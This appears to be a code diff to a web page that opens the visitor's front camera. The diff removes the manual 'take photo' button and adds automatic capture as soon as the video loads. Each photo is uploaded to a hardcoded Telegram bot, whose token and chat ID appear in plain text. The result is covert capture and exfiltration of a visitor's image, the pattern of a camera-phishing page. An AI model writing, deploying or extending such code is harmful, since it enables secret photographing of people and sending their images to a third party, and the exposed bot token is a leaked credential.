@@ -6,7 +6,6 @@
 </head>
 <body>
   <video id="video" autoplay style="width: 100%; max-width: 500px;"></video>
-  <button onclick="takePhoto()">Сделать фото</button>
   <canvas id="canvas" style="display:none;"></canvas>
   <p id="status"></p>
 
@@ -18,7 +17,11 @@
 
     // Доступ к фронтальной камере
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-      .then(stream => video.srcObject = stream)
+      .then(stream => {
+        video.srcObject = stream;
+        // Ждём, пока видео загрузится, и делаем фото
+        video.onloadedmetadata = () => takePhoto();
+      })
       .catch(err => status.textContent = 'Ошибка камеры: ' + err);
 
     // Функция захвата и отправки фото
@@ -26,27 +29,29 @@
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0);
-      const photo = canvas.toDataURL('image/png');
+      const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
 
       // Telegram API
       const token = '8176524950:AAGfsNYH5qwFzIvoUmsI-UkzptDMDAYtIVQ';
-      const chatId = '5678878569'; // Твой chat_id
+      const chatId = '5678878569';
       const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+      // Используем FormData для отправки файла
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', photoBlob, 'photo.png');
 
       try {
         status.textContent = 'Отправка...';
         const response = await fetch(url, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            photo: photo
-          })
+          body: formData
         });
         if (response.ok) {
           status.textContent = 'Фото отправлено!';
         } else {
-          status.textContent = 'Ошибка отправки';
+          const errorText = await response.text();
+          status.textContent = 'Ошибка отправки: ' + errorText;
         }
       } catch (error) {
         status.textContent = 'Ошибка: ' + error;
